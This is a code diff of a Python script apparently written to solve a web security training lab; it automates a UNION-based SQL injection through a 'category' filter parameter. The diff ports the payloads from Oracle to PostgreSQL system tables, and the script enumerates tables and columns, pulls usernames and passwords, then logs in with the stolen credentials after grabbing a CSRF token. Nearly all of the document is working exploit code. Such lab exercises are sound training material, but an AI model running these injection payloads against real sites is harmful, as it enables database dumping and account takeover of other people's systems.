@@ -22,24 +22,25 @@ class SQL(Base):
         return parsed_content
 
     def _get_table_names(self):
-        params = {'category': "Gifts' union select owner, table_name from all_tables-- "}
+        params = {'category': "Gifts' union select table_schema, table_name from information_schema.tables-- "}
         response = self.session.get(f"{self.base_url}/filter", params=params)
         table_names = self._parse_response(response)
         
+        clean_table_names = []
         for table in table_names:
-            if table["content"].startswith("USERS"):
-                return table["content"]
-        return None
+            if table["header"] != "pg_catalog" and table["header"] != "information_schema" and table["content"] != "products":
+                clean_table_names.append(table["content"])
+        return clean_table_names.pop()
 
     def _get_table_columns(self, table_name):   
-        params = {'category': f"Gifts' union select data_type, column_name from all_tab_columns where table_name = '{table_name}'-- "}
+        params = {'category': f"Gifts' union select is_nullable, column_name from information_schema.columns where table_name = '{table_name}'-- "}
         response = self.session.get(f"{self.base_url}/filter", params=params)
         table_columns = self._parse_response(response)
         to_return = {'users_table': None, 'passwords_table': None}
         for column in table_columns:
-            if "PASSWORD_" in column["content"]:
+            if "password" in column["content"]:
                 to_return['passwords_table'] = column["content"]
-            elif "USERNAME_" in column["content"]:
+            elif "username" in column["content"]:
                 to_return['users_table'] = column["content"]
         return to_return
     
@@ -64,8 +65,7 @@ class SQL(Base):
         
         if csrf_input and csrf_input.get('value'):
             csrf_token = csrf_input.get('value')
-            if self.verbose:
-                self.log(f"Found CSRF token: {csrf_token}", "info")
+            self.log(f"Found CSRF token: {csrf_token}", "verbose")
         else:
             self.log("Could not find CSRF token in the response", "error")
             exit(1)
@@ -74,7 +74,11 @@ class SQL(Base):
 
     def run(self):
         users_table = self._get_table_names()
+        self.log(f"Identified users table: {users_table}", "verbose")
+
         users_table_columns = self._get_table_columns(users_table)
+        self.log(f"Identified users table columns: {users_table_columns}", "verbose")
+
         data = self._get_table_data(users_table, users_table_columns['users_table'], users_table_columns['passwords_table'])
         if data is None:
             self.log("Failed to get compromised credentials", "error")
@@ -84,11 +88,11 @@ class SQL(Base):
         self.params = {'username': data['username'], 'password': data['password'], 'csrf': csrf_token}
         response = self.session.post(f"{self.base_url}/login", data=self.params)
 
-        if self.verbose:
-            self.log(f"Response status code: {response.status_code}", "info")
+        self.log(f"Response status code: {response.status_code}", "verbose")
 
         self.is_lab_solved()
-    
+        
+
 
 if __name__ == "__main__":
     sql = SQL()
